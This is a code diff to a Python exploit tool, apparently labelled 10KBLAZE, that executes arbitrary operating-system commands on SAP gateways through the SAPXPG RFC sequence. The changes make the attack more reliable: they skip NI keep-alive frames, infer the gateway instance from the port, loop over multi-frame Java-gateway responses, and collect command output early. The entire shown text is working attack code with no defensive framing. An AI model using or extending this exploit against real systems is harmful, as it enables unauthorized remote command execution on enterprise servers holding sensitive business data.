@@ -30,24 +30,32 @@ def ni_send(sock, payload):
 
 
 def ni_recv(sock, timeout=10):
-    """Receive one SAP NI frame: 4-byte length prefix + payload."""
+    """Receive one SAP NI frame: 4-byte length prefix + payload.
+
+    Zero-length frames are NI PING keep-alives (common on SAP Java gateways)
+    and are silently skipped; the next real frame is returned instead.
+    """
     sock.settimeout(timeout)
-    hdr = b""
-    while len(hdr) < 4:
-        chunk = sock.recv(4 - len(hdr))
-        if not chunk:
-            raise ConnectionError("Connection closed while reading NI header")
-        hdr += chunk
-    length = struct.unpack("!I", hdr)[0]
-    if length > 0x100000:  # sanity: 1 MB max
-        raise ValueError("NI frame too large: %d bytes" % length)
-    data = b""
-    while len(data) < length:
-        chunk = sock.recv(min(length - len(data), 65536))
-        if not chunk:
-            raise ConnectionError("Connection closed while reading NI payload")
-        data += chunk
-    return data
+    while True:
+        hdr = b""
+        while len(hdr) < 4:
+            chunk = sock.recv(4 - len(hdr))
+            if not chunk:
+                raise ConnectionError("Connection closed while reading NI header")
+            hdr += chunk
+        length = struct.unpack("!I", hdr)[0]
+        if length == 0:
+            # NI PING / keep-alive — skip and read next frame
+            continue
+        if length > 0x100000:  # sanity: 1 MB max
+            raise ValueError("NI frame too large: %d bytes" % length)
+        data = b""
+        while len(data) < length:
+            chunk = sock.recv(min(length - len(data), 65536))
+            if not chunk:
+                raise ConnectionError("Connection closed while reading NI payload")
+            data += chunk
+        return data
 
 
 # ---------------------------------------------------------------------------
@@ -906,6 +914,12 @@ def main():
 
     if args.port is None:
         args.port = 3300 + int(args.instance)
+    elif args.instance == "00" and args.port != 3300:
+        # Port was given explicitly but instance was not — infer instance from port
+        # so that P1 service/tp names match the actual gateway instance.
+        inferred = args.port - 3300
+        if 0 < inferred < 100:
+            args.instance = "%02d" % inferred
 
     print("=" * 60)
     print("SAP Gateway SAPXPG Command Execution (10KBLAZE)")
@@ -982,22 +996,51 @@ def main():
     print("[+] Conversation ID: %s" % conv_id)
 
     # Step 3: F_SAP_SEND (SAPXPG_START_XPG_LONG)
+    # SAP Java gateways send multiple NI frames in response to this step:
+    #   Frame 1 — intermediate ack ("sapxpg started")
+    #   Frame 2 — STRTSTAT + optional output
+    # We loop until we find STRTSTAT or an error, collecting all frames.
     print("\n[*] Step 3: SAPXPG_START_XPG_LONG (executing: %s %s)" % (
         args.command, args.params))
     p3_data = build_p3(conv_id, args.host, args.hostname, args.sid,
                        args.instance, args.kernel, args.dest, args.client,
                        args.command, args.params)
     ni_send(sock, p3_data)
-    resp = ni_recv(sock, args.timeout)
-    print("[+] Response: %d bytes" % len(resp))
-    if args.verbose:
-        print(hexdump(resp[:500]))
 
-    info = parse_response(resp, "SAPXPG_START_XPG_LONG")
-    if info["error"]:
-        print("[-] Error: %s" % info["error_msg"])
-        sock.close()
-        sys.exit(1)
+    info = {"error": False, "strtstat": None}
+    p3_output_lines = []
+    p3_frame_count = 0
+    while True:
+        try:
+            resp = ni_recv(sock, args.timeout)
+        except socket.timeout:
+            if p3_frame_count == 0:
+                print("[-] Timeout waiting for Step 3 response")
+                sock.close()
+                sys.exit(1)
+            # No more frames arriving — treat as end of P3 response stream
+            break
+        p3_frame_count += 1
+        print("[+] Response frame %d: %d bytes" % (p3_frame_count, len(resp)))
+        if args.verbose:
+            print(hexdump(resp[:500]))
+
+        info = parse_response(resp, "SAPXPG_START_XPG_LONG")
+        if info["error"]:
+            print("[-] Error: %s" % info["error_msg"])
+            sock.close()
+            sys.exit(1)
+
+        # Collect any output lines already embedded in P3 frames (Java style)
+        lines = extract_p4_output(resp)
+        p3_output_lines.extend(lines)
+
+        if info["strtstat"]:
+            break  # Got definitive status — stop reading P3 frames
+
+        # No STRTSTAT yet — try to read the next frame (intermediate ack case)
+        # Use a short timeout so we don't hang if there are no more frames
+        sock.settimeout(2)
 
     if info["strtstat"]:
         status_map = {"O": "OK (command executed)", "F": "Failed", "E": "Error"}
@@ -1017,7 +1060,15 @@ def main():
                 print("    %s" % s)
 
     # Step 4: SAPXPG_END_XPG (optional)
-    if not args.skip_end_xpg:
+    # Skip automatically if output was already captured in P3 frames (SAP Java
+    # style) — sending P4 to a Java gateway that already finished causes it to
+    # close the connection and produces a timeout.
+    if p3_output_lines and not args.skip_end_xpg:
+        print("\n[+] Command output (from Step 3 frames):")
+        for line in p3_output_lines:
+            print("    %s" % line)
+        print("\n[*] Skipping SAPXPG_END_XPG (output already received in Step 3)")
+    elif not args.skip_end_xpg:
         print("\n[*] Step 4: SAPXPG_END_XPG (retrieving output)")
         p4_data = build_p4(conv_id, args.host, args.hostname, args.sid,
                            args.instance, args.kernel, args.dest, args.client)
